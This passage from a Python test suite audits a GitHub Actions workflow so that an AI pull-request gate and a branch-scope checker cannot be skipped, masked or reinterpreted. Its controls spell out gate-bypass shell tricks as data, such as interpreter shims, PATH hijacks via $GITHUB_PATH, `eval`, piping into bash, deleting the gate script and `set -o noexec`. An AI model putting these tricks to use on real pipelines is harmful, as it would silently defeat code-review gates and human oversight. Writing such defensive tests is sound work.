        # Keys, exactly: `if:`/`continue-on-error:` were the two a regex looked for, but `shell:`
        # ("cat {0}" makes the runner print the script instead of executing it) and `env:`
        # (re-pointing SEL at an empty selection) neutralise the step just as completely, and no
        # enumeration of bad keys would have named them all.
        check("the gate step carries only a name and a script, so nothing can skip, tolerate or "
              "reinterpret it (add a key to ALSO_FINE only if it cannot make a failure pass)",
              sorted(set(gate_step) - ALSO_FINE) == ["name", "run"], sorted(gate_step))
        # Pinned by *what the flags do*, not by the literal: `set -euxo pipefail` adds tracing and
        # still aborts on the first error, so rejecting it was a false alarm — and the old message
        # said the step no longer aborts, which was flatly wrong. `-e`, `-u` and `-o pipefail` are
        # required; extra letters are allowed; dropping one is not.
        opener = (cmds[:1] or [""])[0]
        check("the gate step opens with a `set` line that keeps -e, -u and -o pipefail, so it aborts "
              "on the first error and reads no unset variable as empty (extra flags such as -x or -E "
              "are allowed; the later lines are governed by ALLOWED_SET)",
              set_flags_ok(opener), opener)
        # Property, not spelling: exactly one command must *execute* the gate with its status still
        # reaching the job. Pinning the last line to one literal rejected two correct edits — a
        # re-raising handler (`|| { echo "::error::…"; exit 1; }`, which this suite separately
        # asserts is not masking) and a trailing `echo "::notice::"`, unreachable under `set -e`.
        runs_gate = [ln for ln in cmds if foreground(ln, "scripts/ai/pr_gate.py")]
        check("one command executes the gate with its verdict reaching the job",
              len(runs_gate) == 1, cmds)
        check("the gate is invoked in exactly the reviewed form (GATE_CMD) — argv is pinned here, "
              "so adding a flag or respelling `python` fails on the pin rather than on anything "
              "about empty diffs",
              len(runs_gate) == 1
              and argv_in(invoking_segment(runs_gate[0], "scripts/ai/pr_gate.py"), (GATE_CMD,)),
              [invoking_segment(ln, "scripts/ai/pr_gate.py") for ln in runs_gate])
        check("every other command is a bare echo, which cannot swallow the verdict",
              all(pure_echo(ln) for ln in cmds[1:] if ln not in runs_gate), cmds)
        check("nothing in the gate step ends the shell before the gate runs",
              not escapes_early(gate_step, after="scripts/ai/pr_gate.py"),
              escapes_early(gate_step, after="scripts/ai/pr_gate.py"))
        check("every segment of the gate step runs a command the step is meant to run — either the "
              "command is not in the whitelists (HARMLESS, TEST_CMDS, NO_OPS, SCRIPTS, GIT_FORMS, "
              "ALLOWED_SET, ALLOWED_ASSIGN), or it is one of them respelled; the segment is printed "
              "below and the fix is to add it there, deliberately",
              not foreign_commands(gate_step), foreign_commands(gate_step))
        check("the gate step neither redirects nor substitutes, so it cannot rewrite the script it "
              "is about to run", not rewrites(gate_step), rewrites(gate_step))
    for line, ok in (("set -euo pipefail", True),
                     # Same options, `-o` written separately — refused for adjacency alone.
                     ("set -eu -o pipefail", True),
                     ("set -Eeuo pipefail", True),
                     ("set -euxo pipefail", True),
                     # `-E` is errtrace, a different option. Case-folding the flag set to admit
                     # `-Eeuo` also admitted this, where there is no lowercase `e` at all: bash leaves
                     # errexit off, so the step stops aborting on error under a check that says it does.
                     ("set -Euo pipefail", False),
                     ("set -eUo pipefail", False),
                     # `-n` reads the script without executing it, which would defang the whole step.
                     ("set -euno pipefail", False),
                     ("set -eu", False),
                     # `-t` makes bash execute one command and exit, and the `set` is that command:
                     # the step exits 0 having run nothing. Admitted for two rounds, because the rule
                     # asked only that `e` and `u` be present and refused `n` by name — a blacklist
                     # needing every dangerous letter named in advance. The letters are whitelisted
                     # now, so this and `-N` (invalid, so bash applies none of the flags) both go.
                     ("set -teuo pipefail", False),
                     ("set -eNuo pipefail", False),
                     ("set -eufo pipefail", False),
                     ("set -evuo pipefail", True),
                     ("set -eo pipefail", False),
                     # Every row above puts `-o pipefail` last, which is how the ordering came to be
                     # pinned. These turn on exactly the same three things in a different order, and
                     # were refused under a message saying the step no longer aborts.
                     ("set -o pipefail -eu", True),
                     ("set -euo pipefail -x", True),
                     ("set -e -u -o pipefail", True),
                     # And the dangerous letters stay refused in the reordered spelling, so the
                     # order-insensitive reading is not a way in.
                     ("set -o pipefail -eun", False),
                     ("set -o pipefail -teu", False),
                     ("set -o pipefail -e", False),
                     # This row passed for the wrong reason — `pipefail` is absent, so it was refused
                     # without the `-o` value being read at all. A fifth misattributed kill, and the
                     # rows below are what it was hiding: with `pipefail` present, `-o` took any value.
                     ("set -eu -o noclobber", False),
                     # `noexec` is `-n` and `onecmd` is `-t` — the two options the letter whitelist
                     # exists to refuse, spelled long. Both defuse the step: it prints nothing and
                     # exits 0, so the gate never runs. Both were accepted.
                     ("set -euo pipefail -o noexec", False),
                     ("set -euo pipefail -o onecmd", False),
                     ("set -o noexec -euo pipefail", False),
                     ("set -euo pipefail -o notarealoption", False),
                     # And the mirror-image false rejection: the all-long spelling turns on exactly
                     # what is required (`false | true` still aborts the step, verified) and was
                     # refused under the message this rule calls the worst one to get wrong.
                     ("set -o errexit -o nounset -o pipefail", True),
                     ("set -o errexit -o nounset -o pipefail -o xtrace", True),
                     ("set -o errexit -o pipefail", False)):
        check(f"the set-line rule reads {line!r} as {'keeping' if ok else 'losing'} -e/-u/pipefail",
              set_flags_ok(line) is ok, line)

    # Selection is the other way to make a passing gate meaningless: `--base HEAD` is an empty diff,
    # and an empty diff selects nothing and exits 0. So SEL may only be built two ways.
    # Both the assignments *and* the export: the gate runs in a different step and receives the
    # value through $GITHUB_ENV, so a rule that reads only `SEL=…` assignments leaves the line that
    # actually reaches the gate unchecked — `echo "SEL=--base HEAD" >> "$GITHUB_ENV"` neutralised
    # the whole gate with both permitted assignments still in place.
    ALLOWED_SEL = ('SEL="--all"', 'SEL="--base ${BASE}"',
                   'echo "SEL=${SEL}" >> "$GITHUB_ENV"')

    def sel_lines(text):
        return [ln.strip() for ln in run_contents(text) if "SEL=" in ln]

    sel = sel_lines(wf)
    check("every line that sets or exports the selection names the whole repo or the real base",
          sel and all(ln in ALLOWED_SEL for ln in sel), sel)
    for label, mutant in (("a neutralised assignment", 'SEL="--base HEAD"'),
                          ("a neutralised export",
                           'echo "SEL=--base HEAD" >> "$GITHUB_ENV"'),
                          ("an export that drops the variable",
                           'echo "SEL=--all" >> "$GITHUB_ENV"')):
        check(f"that rule rejects {label}", not all(ln in ALLOWED_SEL for ln in [mutant]))
    # The selection is not the only thing a step can hand the gate. `$GITHUB_ENV` and `$GITHUB_PATH`
    # cross step boundaries, so an earlier step can re-point `PATH` at a shim and the gate step —
    # whose every segment is whitelisted — would still be running `python` as written and getting
    # something else. Whitelisting the *writes* covers both variables and any value either carries.
    #
    # Filtered on the *destination*, never on the content. Two rules in this file were written the
    # other way — one keyed on `SEL=`, one on `ref=` — and both were escapable by a mutation that
    # avoided the substring while doing the thing: `echo "ref""=HEAD" >> "$GITHUB_OUTPUT"` is two
    # quoted words bash concatenates, GitHub honours the last write, and neither rule's subject set
    # contained the line. The destination cannot be avoided the same way, because a step that wants to
    # reach a later one has to write to one of these four files, and `redirections()` already refuses
    # every other target. So all four are read here, as one rule, rather than one file per rule.
    crossings = [ln.strip() for ln in run_contents(wf) if hands_over(ln)]
    # A step summary is display-only: it reaches the PR page, not a later step's environment, so it is
    # matched by shape instead of enumerated. Leaving it out made `REDIR_TARGETS` advertise a
    # destination this rule refused, and a reader who meets two rules disagreeing concludes the suite
    # is arbitrary rather than that one of them is wrong.
    # `[^"]*`, not `.*`: greedy and unanchored inside the quotes, `.*` spanned an entire earlier
    # command *including its own redirection*, so any line whose last command was a summary echo was
    # admitted whole — `echo "SEL""=--base HEAD" >> "$GITHUB_ENV" ; echo "x" >> "$GITHUB_STEP_SUMMARY"`
    # passed every rule and neutralised the selection. That was a live false green in the two steps
    # `rewrites()` does not cover.
    riders = [ln for ln in crossings if rides(ln)]
    check("a line that hands a value to a later step carries nothing else, so no command can ride "
          "along behind a permitted write (ALLOWED_WRITES)", not riders, riders)
    check("the only values a step hands another are the selection and the base ref, so nothing can "
          "re-point PATH, the interpreter or the diff out of band — extend ALLOWED_WRITES to add one "
          "(a step summary is display-only and allowed by shape, see SUMMARY)",
          crossings and all(permitted_write(ln) for ln in crossings), crossings)
    # Through `rides`/`permitted_write` rather than re-deriving their conditions: spelled inline, these
    # controls compared a literal against a literal from the same source and passed with the rules
    # narrowed or deleted.
    for label, mutant in (("a neutralising export riding behind a permitted summary write",
                           'echo "SEL""=--base HEAD" >> "$GITHUB_ENV" ; echo "x" >> '
                           '"$GITHUB_STEP_SUMMARY"'),
                          ("a PATH prepend riding behind one",
                           'echo "/tmp/shim" >> "$GITHUB_PATH" && echo "x" >> '
                           '"$GITHUB_STEP_SUMMARY"')):
        check(f"those two rules reject {label}",
              rides(mutant) and not permitted_write(mutant), mutant)
    for label, spelling in (("on a line of its own",
                             'echo "selection was --all" >> "$GITHUB_STEP_SUMMARY"'),
                            ("written without spaces around the operator",
                             'echo "x">>"$GITHUB_STEP_SUMMARY"'),
                            ("written with the braced variable",
                             'echo "x" >> "${GITHUB_STEP_SUMMARY}"')):
        check(f"and a plain summary write {label} is still accepted",
              permitted_write(spelling) and not rides(spelling), spelling)
    for label, mutant in (("a PATH re-pointed for later steps",
                           'echo "PATH=/tmp/shim:$PATH" >> "$GITHUB_ENV"'),
                          ("a directory prepended to PATH",
                           'echo "/tmp/shim" >> "$GITHUB_PATH"'),
                          ("a second base-ref write split around the substring a content filter "
                           "would key on", 'echo "ref""=HEAD" >> "$GITHUB_OUTPUT"'),
                          ("the same trick on the selection export",
                           'echo "SEL""=--base HEAD" >> "$GITHUB_ENV"'),
                          ("a write whose destination is unquoted", "echo x >> $GITHUB_ENV")):
        check(f"that rule rejects {label}", mutant not in ALLOWED_WRITES)
        check("and its subject set contains that line, which is the half a content filter missed",
              bool(re.search(r'>>?\s*"?\$GITHUB_(ENV|PATH|OUTPUT|STEP_SUMMARY)', mutant)), mutant)
    # Two shell constructs are refused workflow-wide rather than modelled, because both make the
    # *whole file's* executed lines mean something other than what this suite reads them as — not
    # just the two whitelisted steps. A backslash turns a separator into text, so `echo disabled\;
    # python …pr_gate.py ${SEL}` is one echo while the segmentation reports an invocation. A heredoc
    # turns the lines that follow it into data, so a phantom `set -- --pr "${PR}"` inside one would
    # satisfy the flag rules for a step that no longer passes the flag. Neither appears in the file,
    # which is what makes refusing them free; if one is ever needed, the segmentation must model it
    # first.
    # A folded scalar is not a line-by-line script: `run: >` makes the runner join the step's lines
    # with spaces, so `set -euo pipefail` swallows the invocation below it as positional arguments and
    # the step exits 0 having run nothing — while `run_contents()` still hands every rule here the
    # lines separately. `run_contents()` deliberately *collects* folded blocks, because an earlier
    # round found the injection rule blind to them; that is about seeing the text, and this is about
    # what the text means. Refusing the style is cheaper than modelling the fold.
    folded = [ln.strip() for ln in strip_comments(wf).splitlines()
              if re.match(r"^\s*run:\s*>[-+]?\s*$", ln)]
    check("every run: block is a literal scalar, since a folded one joins the lines this suite reads "
          "as separate commands", not folded, folded)
    check("that rule can see a folded block",
          [ln for ln in "        run: >\n          set -euo pipefail\n".splitlines()
           if re.match(r"^\s*run:\s*>[-+]?\s*$", ln)])
    check("and accepts the two styles the workflow uses",
          not [ln for ln in "        run: |\n          echo x\n        run: echo y\n".splitlines()
               if re.match(r"^\s*run:\s*>[-+]?\s*$", ln)])
    for label, hits in (("a backslash escape or line continuation",
                         [ln.strip() for ln in run_contents(wf) if "\\" in ln]),
                        ("an input redirection or heredoc, whose body this suite would read as "
                         "commands", [ln.strip() for ln in run_contents(wf) if "<" in ln])):
        check(f"no executed line uses {label}", not hits, hits)
    check("that pair of rules can see an escaped separator",
          [ln for ln in run_contents(
              '        run: |\n          echo disabled\\; python scripts/ai/pr_gate.py ${SEL}\n')
           if "\\" in ln])
    check("and a heredoc that would hide a command as data",
          [ln for ln in run_contents(
              "        run: |\n          echo disabled <<'echo'\n          set -- --pr \"${PR}\"\n")
           if "<" in ln])
    # --pr, not merely the script: without it the checker loses signal 2 (STACKED), so a
    # half-defanged invocation would otherwise read as fully wired. The flag is asserted over the
    # executed shell rather than on the invocation line, because the workflow builds the argument
    # list first (`set -- --pr …`) to share one retry loop with the fork path.
    shell = "\n".join(run_contents(wf))
    check("branch scope is executed", invocations("scripts/ai/check_branch_scope.py"), shell)
    # This step cannot be pinned to the gate's shape: it *needs* an `if:` (there is no PR number on
    # a dispatch), and it deliberately runs under `set +e` to capture `$?` for the retry loop. So
    # the two things that shape depends on are pinned instead — the condition it may carry, and the
    # capture of the real exit code, which `code=0` would otherwise replace while leaving the
    # `-ne 2` comparison below intact and passing.
    found_scope = steps_named(gate_job, "scripts/ai/check_branch_scope.py")
    check("exactly one step runs branch scope", len(found_scope) == 1, len(found_scope))
    if len(found_scope) == 1:
        scope_step = found_scope[0]
        # ALSO_FINE for the same reason the per-step key rule subtracts it: `timeout-minutes`, `shell`
        # and `id` cannot express the threat these key rules are about. Omitted here, this rule and
        # that one disagreed about the same three words, so adding a timeout to *this* step was a
        # rejection and adding it to the gate step was not.
        SCOPE_KEYS = {"name", "if", "env", "run"} | ALSO_FINE
        extra = sorted(set(scope_step) - SCOPE_KEYS)
        check("branch scope carries only keys its shape needs (SCOPE_KEYS | ALSO_FINE)",
              not extra, extra)
        check("branch scope runs on pull requests, the only event with a PR number",
              scope_step.get("if") == "github.event_name == 'pull_request'", scope_step.get("if"))
        # The env is pinned per key, because these four values decide which branch the step takes
        # and what it compares: pinning `CROSS`'s *expression* is what stops a hardcoded `CROSS:
        # "true"` sending every PR down the fork path, where --pr — and with it signal 2 — is gone.
        SCOPE_ENV = {
            "PR": "${{ github.event.pull_request.number }}",
            "BASE_REF": "${{ github.base_ref }}",
            "CROSS": "${{ github.event.pull_request.head.repo.full_name != github.repository }}",
            "GH_TOKEN": "${{ secrets.GITHUB_TOKEN }}",
        }
        check("the inputs that decide its comparison are the real event values, per key (SCOPE_ENV) "
              "— adding a variable here means adding it there",
              (scope_step.get("env") or {}) == SCOPE_ENV, scope_step.get("env"))
        seq = shell_of(scope_step)
        called = [i for i, ln in enumerate(seq)
                  if foreground(ln, "scripts/ai/check_branch_scope.py")]
        check("the checker is invoked as a bare command", called, seq)
        # `--no-fetch` may ride on the invocation instead of the argument list, which is one of the
        # correct edits this suite promises to accept; nothing else may.
        check("the checker receives the argument list this step built, not literal refs",
              all(argv_in(invoking_segment(seq[i], "scripts/ai/check_branch_scope.py"),
                          (SCOPE_CMD, SCOPE_CMD + " --no-fetch")) for i in called),
              [invoking_segment(seq[i], "scripts/ai/check_branch_scope.py") for i in called])
        # Both halves matter, and only the first was asserted. Pinning the line *after* the invocation
        # says nothing about how many times `code` is written, and in shell the last write wins — so
        # appending `sleep 0` + a second `code=$?` left `code=0` on every verdict and the step exited 0
        # with the suite green. `reraises()` returns True unconditionally for `$code` on the strength of
        # this rule (`ALLOWED_ASSIGN` admits no spelling but `code=$?`), so the durability it assumes
        # has to be enforced here: the assignment appears where it is captured, and nowhere else.
        captures = [j for j, ln in enumerate(seq) if ln == "code=$?"]
        check("its real exit code is what the retry loop reads, and nothing reassigns `code` "
              "afterwards (the last write wins, so a second `code=$?` reads whatever ran last)",
              all(seq[i + 1:i + 2] == ["code=$?"] for i in called)
              and captures == [i + 1 for i in called],
              f"captures at {captures}, invocations at {called}" if captures != [i + 1 for i in called]
              else seq)
        # The fork branch is the one without --pr, so a condition that is always true sends every
        # PR down it and loses STACKED permanently while `set -- --pr` survives, unreachable, in the
        # else. Textual rules could see the flag but not which branch runs.
        check("the fork branch is taken only for a genuine cross-repository PR",
              [ln for ln in seq
               if canonical_shell(ln) == 'if [ "${CROSS}" = "true" ]; then'], seq)
        # A property, not a mechanism: the earlier rule pinned `set --` as the way the flag is
        # assembled, which rejected the equivalent (and clearer) edit of putting it on the
        # invocation. What matters is that the flag reaches the checker, however the args are built.
        no_fetch = [ln for ln in seq
                    if foreground(ln, "set --", ["--no-fetch"])
                    or foreground(ln, "check_branch_scope.py", ["--no-fetch"])]
        check("the checker does not fetch, since checkout already did so authenticated",
              no_fetch, seq)
        check("nothing in the branch-scope step ends the shell before the checker runs",
              not escapes_early(scope_step, after="scripts/ai/check_branch_scope.py"),
              escapes_early(scope_step, after="scripts/ai/check_branch_scope.py"))
        check("every segment of the branch-scope step runs a command the step is meant to run — see "
              "the whitelists named in the gate-step version of this rule; the segment is below",
              not foreign_commands(scope_step), foreign_commands(scope_step))
        check("the branch-scope step neither redirects nor substitutes",
              not rewrites(scope_step), rewrites(scope_step))
    # Where the flag appears, not merely that it appears in an executed line. Searching the whole
    # shell passed the mutation that removes --pr, because the fork branch *echoes* the words
    # "needs --pr" while explaining its absence. Third instance in this round of the same shape:
    # comment-stripping is not enough, since a string inside an echo is executed and still inert.
    def pr_arg(ln):
        return (foreground(ln, "set --", ["--pr"])
                or foreground(ln, "check_branch_scope.py", ["--pr"]))

    pr_form = [ln for ln in run_contents(wf) if pr_arg(ln)]
    check("--pr reaches the checker as an argument, which is what gets both signals",
          pr_form, shell)
    check("that rule is not satisfied by an echo that merely mentions the flag",
          not [ln for ln in run_contents('        run: echo "STACKED needs --pr and is off"\n')
               if pr_arg(ln)])
    check("that rule rejects a checker that is echoed rather than run",
          not pr_arg('            echo python scripts/ai/check_branch_scope.py "$@" --pr'))
    check("that rule rejects a checker whose verdict is discarded",
          not pr_arg('            python scripts/ai/check_branch_scope.py --pr 1 || true'))
    check("that rule rejects --pr echoed beside a real argument list on one line",
          not pr_arg('            set -- --base origin/264 --head HEAD; '
                     'echo "STACKED needs --pr and is off"'))
    # Controls for the step-scoped rules. Each feeds the real predicate a mutated step, because a
    # control that only re-states its own input tests nothing: the previous `continue-on-error`
    # control asserted the string was in a string containing it, which no change to the rule could
    # ever fail.
    # Each control runs the *real* predicate over a mutated workflow, because the versions these
    # replace fed a mutated step to a rule that no longer exists: they asserted a regex for
    # `if|continue-on-error` still matched, while the assertion above had become a key whitelist.
    # A control for a retired rule reports on nothing and keeps reporting PASS.
    def gate_step_of(text):
        _, job = None, None
        try:
            parsed = parse_yaml(text)
        except YamlUnsupported:
            return None, {}
        for job in (parsed.get("jobs") or {}).values():
            hits = [s for s in (job.get("steps") or [])
                    if step_runs(s, "scripts/ai/pr_gate.py",
                                 ("--requirements", "--list", "--help"))]
            if hits:
                return hits[0], job
        return None, {}

    # Synthetic: the mutant is a step mapping, not a splice into the real file. Anchored on
    # `"      - name: Run the gate\n        run: |"`, these five stopped applying the moment that step
    # was renamed — and each then reported the rule "rejects a conditional gate step", which is an
    # accusation about a mutation nobody made. It is also the kill-attribution lesson twice over: a
    # control that depends on the artifact's text measures the text, not the rule.
    # `- ALSO_FINE`, as the rule at the top of this section spells it. Without the subtraction the
    # control's verdict differed from the rule's on exactly the row that mattered: `shell` is in
    # `ALSO_FINE`, so the key rule *accepts* `shell: "cat {0}"` and the refusal actually comes from the
    # value rule below. The control claimed the kill for the rule it names, which is the
    # kill-attribution lesson a third time — and it is the reason the `shell` row moved.
    for label, key, value in (("a conditional gate step", "if", False),
                              ("a gate step that tolerates failure", "continue-on-error", True),
                              ("a quoted key the old regex could not see", '"continue-on-error"',
                               True),
                              ("a step env that re-points the selection", "env",
                               {"SEL": "--all --dry-run"})):
        mutant = {"name": "Run the gate", "run": "set -euo pipefail\n", key: value}
        check(f"the gate-step key rule rejects {label}",
              sorted(set(mutant) - ALSO_FINE) != ["name", "run"], sorted(mutant))
    # The two `shell` rows, moved to the rule that actually decides them and asserted through it. The
    # acceptance half used to read `all(v == "bash" for v in {"shell": "bash"}.values())` — a dict built
    # in the assertion, compared with itself. It passed with the rule deleted, inverted, or narrowed to
    # no steps, and it was the only control the key had.
    for label, shells, ok in (("a shell that prints the script instead of running it",
                               {"Run the gate": "cat {0}"}, False),
                              ("a shell that pipes the script into a reader",
                               {"Run the gate": "cat {0} | head -1"}, False),
                              ("the runner default, which reinterprets nothing",
                               {"Run the gate": "bash"}, True)):
        check(f"the step-shell value rule {'accepts' if ok else 'rejects'} {label}",
              all(v == "bash" for v in shells.values()) is ok, shells)
    JOB_MUTANTS = {
        "a job that tolerates failure": "    continue-on-error: true",
        "a job that never runs": "    if: false",
        "a job default shell that swallows every step": "    defaults:\n      run:\n"
                                                        '        shell: "cat {0}"',
    }
    # Both of these used to be built from `wf`, so a job-level `concurrency:` broke the first and a
    # second job broke both — each then reporting that the *suite's own* positional-window fix had
    # regressed, about an edit the maintainer never made. Built from a literal instead: the property
    # is what `gate_step_of` does with a shape, and the shape can be written down.
    LITERAL_WF = ("name: Fixture\non:\n  pull_request:\njobs:\n"
                  "  gate:\n    name: Mechanical checks\n    runs-on: ubuntu-latest\n"
                  "    steps:\n      - name: Run the gate\n        run: |\n"
                  "          python scripts/ai/pr_gate.py ${SEL}\n")
    for label, extra in JOB_MUTANTS.items():
        mutant = LITERAL_WF.replace("    runs-on: ubuntu-latest\n",
                                    "    runs-on: ubuntu-latest\n" + extra + "\n", 1)
        assert mutant != LITERAL_WF, "the job mutant anchor missed, so this asserts nothing"
        _, job = gate_step_of(mutant)
        check(f"the job key rule rejects {label}", sorted(set(job) - JOB_KEYS), sorted(job))
    check("the job rule sees a key appended after the steps list, which a positional window missed",
          sorted(set(gate_step_of(LITERAL_WF + "    if: false\n")[1]) - JOB_KEYS) == ["if"])
    check("a decoy job before the real one no longer hides it",
          sorted(set(gate_step_of(
              LITERAL_WF.replace("jobs:\n  gate:", "jobs:\n  noop:\n    runs-on: ubuntu-latest\n"
                                 "    steps:\n      - name: nothing\n        run: echo ok\n\n  gate:", 1)
          )[1]) - JOB_KEYS) == [])
    # The parser's refusals are what make every whitelist above honest: a shape it cannot model is
    # a step whose keys are invisible, which would satisfy "only these keys" by having none.
    for bad, why in (("jobs:\n  gate:\n    steps:\n      - { name: x, run: echo hi }\n",
                      "a flow-style step"),
                     # Refused only in the sequence branch, this one reached the rules as the string
                     # "{fetch-depth: 1}" and crashed them on `.get` — with zero [FAIL] labels, for a
                     # shallow checkout, which is a real defang and had to read as a refusal.
                     ("jobs:\n  gate:\n    steps:\n      - uses: actions/checkout@v6\n"
                      "        with: {fetch-depth: 1, persist-credentials: false}\n",
                      "a flow mapping as a value"),
                     ("a: &anchor 1\nb: *anchor\n", "an anchor or alias"),
                     ("a: 1\na: 2\n", "a duplicate key"),
                     ("a:\n\t- 1\n", "a tab")):
        try:
            parse_yaml(bad)
            refused = False
        except YamlUnsupported:
            refused = True
        check(f"the reader refuses {why} rather than reading past it", refused)
    # And the shapes it must *read*, not refuse: an explicit null value is how "this event, no
    # filters" is legally written, and read as the string 'null' it made a filterless trigger report
    # three filters (the letters) and then crash.
    for spelling in ("null", "~"):
        parsed = parse_yaml(f"on:\n  pull_request: {spelling}\n  merge_group:\n")
        check(f"an explicit {spelling!r} value reads as absent rather than as a string",
              parsed.get("on", {}).get("pull_request") is None, parsed.get("on"))
    TRAILING = {
        "a masked verdict": "python scripts/ai/pr_gate.py ${SEL} || echo warn",
        "a backgrounded gate": "python scripts/ai/pr_gate.py ${SEL} &",
        "a gate wrapped in a conditional": "if python scripts/ai/pr_gate.py ${SEL}; then :; fi",
        "a verdict eaten by substitution": 'true "$(python scripts/ai/pr_gate.py ${SEL})"',
        "an inline comment in place of the call":
            "set -euo pipefail # TODO: re-enable python scripts/ai/pr_gate.py ${SEL}",
        "a gate wrapped in a while loop": "while python scripts/ai/pr_gate.py ${SEL}; do :; done",
        "a gate wrapped in until": "until python scripts/ai/pr_gate.py ${SEL}; do break; done",
        "a negated gate": "! python scripts/ai/pr_gate.py ${SEL}",
        # Four tails that end with a real `exit` the shell either never reaches or reaches with a
        # zero `$?`. The first is the dangerous one: it differs from the handler this file documents
        # as *correct* only in a brace group, and reads like an improvement on it. All four verified
        # in bash — the step exits 0 with the gate's failure discarded.
        "a status re-raised after an annotation":
            'python scripts/ai/pr_gate.py ${SEL} || echo "::error::gate failed"; exit $?',
        "a status re-raised after an annotation inside the handler":
            'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit $?; }',
        "a status re-raised only when the handler succeeded":
            "python scripts/ai/pr_gate.py ${SEL} || true && exit $?",
        "a handler whose re-raise sits under a false condition":
            'python scripts/ai/pr_gate.py ${SEL} || { echo "x"; if false; then exit 1; fi; }',
    }
    for label, last in TRAILING.items():
        check(f"the executed-gate rule rejects {label}",
              not executes(strip_comments(last), "scripts/ai/pr_gate.py"))
    # …and the shape that is genuinely fine, which the same walk had been refusing: `cmd; exit $?`
    # propagates `cmd`'s status exactly. Read as "a `;` means no failure was caught", it cost 19
    # spurious [FAIL]s on a line a maintainer would reasonably write.
    check("the executed-gate rule accepts a sequential re-raise of the gate's own status",
          executes('python scripts/ai/pr_gate.py ${SEL}; exit $?', "scripts/ai/pr_gate.py"))
    # The between-commands rule is now "a bare echo", not "starts with echo": the prefix form
    # accepted a line that echoes and then does anything at all.
    for label, ln in (("an appended exit 0", "exit 0"),
                      ("an echo that then exits", 'echo "disabled" && exit 0'),
                      ("an echo that then shadows the interpreter",
                       'echo "shim"; python() { return 0; }'),
                      ("an echo piped into a shell", 'echo "$CMD" | bash')):
        check(f"the between-commands rule rejects {label}", not pure_echo(ln))
    check("that rule still accepts a plain progress echo", pure_echo('echo "running the gate"'))
    # Skippable, not merely masked. Both load-bearing invocations are pinned to a command bash will
    # actually reach: `true || python …` is a real invocation whose status a `code=$?` on the next
    # line duly captures — as 0, because the command never ran.
    for label, ln in (("a command skipped by a succeeding predecessor",
                       'true || python scripts/ai/check_branch_scope.py "$@"'),
                      ("a command skipped by a failing predecessor",
                       'false && python scripts/ai/check_branch_scope.py "$@"'),
                      ("a gate skipped by a succeeding predecessor",
                       "true || python scripts/ai/pr_gate.py ${SEL}")):
        script = ("scripts/ai/pr_gate.py" if "pr_gate" in ln
                  else "scripts/ai/check_branch_scope.py")
        check(f"the foreground rule rejects {label}", not foreground(ln, script))
        check(f"and the older masking rule could not see {label}", executes(ln, script))
    check("the foreground rule still accepts a cleanup before the real command, which `;` cannot skip",
          foreground("rm -f gate.log || true; python scripts/ai/pr_gate.py ${SEL}",
                     "scripts/ai/pr_gate.py"))
    # Unreachable, not merely skippable: a predecessor that ends the shell needs no conditional to
    # make what follows it dead, so `;` — the separator the rule above deliberately accepts — is
    # exactly the one this shape uses.
    for label, ln in (("a gate behind a successful exit",
                       "exit 0; python scripts/ai/pr_gate.py ${SEL}"),
                      ("a checker behind a successful exit",
                       'exit 0; python scripts/ai/check_branch_scope.py "$@"'),
                      ("a gate behind a return",
                       "return 0; python scripts/ai/pr_gate.py ${SEL}")):
        script = ("scripts/ai/pr_gate.py" if "pr_gate" in ln
                  else "scripts/ai/check_branch_scope.py")
        check(f"the foreground rule rejects {label}", not foreground(ln, script))
        check(f"and the skippable-command rule could not see {label}", executes(ln, script))
    check("a handler that re-raises still reads as running, since the invocation precedes its exit",
          foreground('python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 1; }',
                     "scripts/ai/pr_gate.py"))
    # Controls for the step-scoped form of the same property. The real steps must pass it; a step
    # with a top-level `exit 0` must not; and nesting must still be read as conditional, or the rule
    # would reject the retry loop's own `exit 2`.
    def as_step(*shell):
        """A step whose `run` carries the indentation a block scalar has in the file, since that is
        what tells a nested line from a top-level one."""
        return {"run": "\n".join(" " * 10 + ln for ln in shell)}

    for label, ln, ok in (("a summary written from the gate step, which reaches the PR page and not "
                           "a later step", 'echo "gate passed" >> "$GITHUB_STEP_SUMMARY"', True),
                          ("a redirection that truncates the script about to run",
                           "echo -n > scripts/ai/pr_gate.py", False)):
        check(f"the redirection rule {'accepts' if ok else 'rejects'} {label}",
              (not rewrites(as_step("set -euo pipefail", ln))) is ok, ln)
    # Controls for the vocabulary rule. The shapes are the ones that make an invocation inert without
    # touching it: a shim on the same line as the real call (which the line-exempting rules could not
    # see), a shim anywhere in a step, and the four other spellings of the same idea.
    for label, snippet in (("a function shadowing the interpreter beside the real call",
                            "python() { return 0; }; python scripts/ai/pr_gate.py ${SEL}"),
                           ("a function shadowing it on a line of its own", "python() { return 0; }"),
                           ("the `function` keyword form", "function python { return 0; }"),
                           ("an alias", "alias python=true"),
                           ("PATH re-pointed inside the step", "PATH=/tmp/shim:$PATH"),
                           ("an exported PATH", "export PATH=/tmp/shim:$PATH"),
                           ("a hashed path for the interpreter", "hash -p /bin/true python"),
                           ("an eval of an arbitrary string", 'eval "$CMD"'),
                           ("the gate read as data by another program",
                            "python -c 'import sys; sys.exit(0)' scripts/ai/pr_gate.py ${SEL}"),
                           ("an older checker restored by a whitelisted command",
                            "git checkout HEAD~50 -- scripts/ai/"),
                           ("a conditional whose condition is an arbitrary command",
                            "if rm -f scripts/ai/pr_gate.py; then :; fi")):
        check(f"the vocabulary rule rejects {label}",
              foreign_commands(as_step("set -euo pipefail", snippet)), snippet)
    for label, snippet in (("an argv override that compares HEAD with itself",
                            "set -- --base HEAD --head HEAD --no-fetch"),
                           ("an argv override that drops the flags",
                            'set -- --pr "${PR}" --no-stacked'),
                           ("a shell option this workflow does not use", "set -x")):
        check(f"the pinned `set` forms reject {label}",
              foreign_commands(as_step("set -euo pipefail", snippet)), snippet)
    for label, ln, script in (
            ("a gate handed a literal selection",
             "python scripts/ai/pr_gate.py --base HEAD", "scripts/ai/pr_gate.py"),
            ("a checker handed literal refs",
             'python scripts/ai/check_branch_scope.py --base HEAD --head HEAD --no-fetch',
             "scripts/ai/check_branch_scope.py")):
        check(f"the invocation rule rejects {label}",
              not argv_in(invoking_segment(ln, script),
                          (GATE_CMD, SCOPE_CMD, SCOPE_CMD + " --no-fetch")),
              invoking_segment(ln, script))
    # Spelled with the `::error::` annotation the correct-edits list names, which is the point: this
    # is the handler `ANNOTATION` exists to keep working, so the control has to exercise the
    # annotation and not a plain message. An earlier revision swapped it for `echo "gate failed"` on
    # the claim that `::` is refused workflow-wide — it is not, display-only annotations are admitted,
    # and the swap deleted the coverage at the new rule's only risk point.
